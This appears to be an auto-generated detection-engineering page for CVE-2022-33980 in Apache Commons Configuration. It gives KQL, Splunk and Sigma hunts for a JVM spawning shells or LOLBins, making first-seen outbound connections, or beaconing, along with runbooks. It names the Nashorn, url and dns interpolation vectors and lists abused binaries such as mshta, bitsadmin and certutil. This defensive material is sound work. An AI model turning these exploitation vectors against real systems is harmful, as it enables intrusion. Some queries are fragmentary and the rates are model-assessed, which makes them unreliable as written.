Detects a java/javaw process spawning a command shell, scripting host, or LOLBin — the post-exploitation footprint of CVE-2022-33980 where the ${script:nashorn:...ProcessBuilder...} interpolation executes OS commands. Article-specific because the PoC literally uses new java.lang.ProcessBuilder(...).start() from the Nashorn script lookup. Rationale: Built directly from the PoC's new java.lang.ProcessBuilder("open","-a","Calculator").start() executed via the ${script:nashorn:} lookup — a Java app spawning an interactive shell/LOLBin is a high-fidelity, near-zero-baseline behavior for server JVMs. Cross-checked against: • https://securitylab.github.com/advisories/GHSL-2022-017_Apache_Commons_Configuration/ • https://snyk.io/blog/cve-2022-33980-apache-commons-configuration-rce-vulnerability/
ATT&CKT1059 T1059.007 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Java build/CI agents (Jenkins, Gradle, Maven) invoking cmd.exe/bash wrapper scripts
  • APM/monitoring Java agents shelling out to whoami or net for host enrichment
  • Java-based admin consoles legitimately running net.exe / certutil for ops tasks
  • Installer JVMs spawning cmd.exe to set registry/PATH
  • Elastic/Logstash Java processes calling helper shell scripts
Suppression filter
| where InitiatingProcessCommandLine !has "jenkins" and InitiatingProcessCommandLine !has "gradle" and InitiatingProcessCommandLine !has "elastic-apm" and InitiatingProcessCommandLine !has "logstash"
Response runbook
1) Triage: inspect ProcessCommandLine of the child and the java parent's command line/JAR path; confirm the host runs an internet-facing Java app and whether a matching CVE-2022-33980 web payload (UC1) preceded this within minutes. 2) Contain: isolate the host, kill the java process tree, and snapshot memory; preserve the offending config source/JAR for forensics. 3) Hunt: pull all child processes of java on the host for the last 14 days, check for outbound URL/DNS fetches by java (UC3), new files written by the child, and lateral movement from the affected account.

| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent

| where SubjectUserName !endswith "$"
| project TimeGenerated, Computer, SubjectUserName, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

Java process fetching first-seen external URL/DNS — Commons Config url/dns lookup (CVE-2022-33980) AICommand & Control Low
Hunts a java/javaw process making its first-ever outbound connection to a never-before-seen external host, consistent with the ${url:} (remote config load) and ${dns:} interpolation lookups of CVE-2022-33980 reaching out to attacker infrastructure. Distinct network pivot from the process-tree detection. Rationale: The article states the ${url:} prefix loads remote files/values and a default ${dns:} lookup resolves DNS — so a vulnerable JVM parsing attacker config will itself emit outbound HTTP/DNS to attacker-controlled hosts; first-seen external destination by java is the cleanest expression of that behavior. Cross-checked against: • https://securitylab.github.com/advisories/GHSL-2022-017_Apache_Commons_Configuration/ • https://snyk.io/blog/cve-2022-33980-apache-commons-configuration-rce-vulnerability/
ATT&CKT1071.001 T1071.004 T1190
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: high — model-assessed, tune to your environment
  • Java apps legitimately fetching remote config/feeds, license checks, or update manifests
  • Maven/Gradle dependency resolution reaching new repos/mirrors
  • Java telemetry/crash-reporting SDKs phoning home to new endpoints
  • Microservices calling a newly-deployed third-party API for the first time
  • CDN/host rotation causing a known service to resolve a new RemoteUrl
Suppression filter
| where RemoteUrl !endswith "maven.org" and RemoteUrl !endswith "gradle.org" and RemoteUrl !has "sentry.io" and RemoteUrl !has "newrelic.com"
Response runbook
1) Triage: review the new RemoteUrl/RemoteIP reputation and the java command line/JAR; correlate timing against a CVE-2022-33980 web payload (UC1) or a java→shell spawn (UC2) on the same host. 2) Contain: block the destination at egress/DNS, and if a shell child was observed, isolate the host. 3) Hunt: check whether the destination was the URL embedded in an inbound ${url:} payload, look for subsequent payload download / java child processes, and sweep other JVM hosts for the same destination.

    | where Timestamp between (ago(30d) .. ago(1d))

    | summarize by RemoteUrl;

| order by FirstSeen desc

Actions on Objectives

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Article-specific behavioural hunt — Safer together: Snyk and CISPA collaborate for the greater good
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
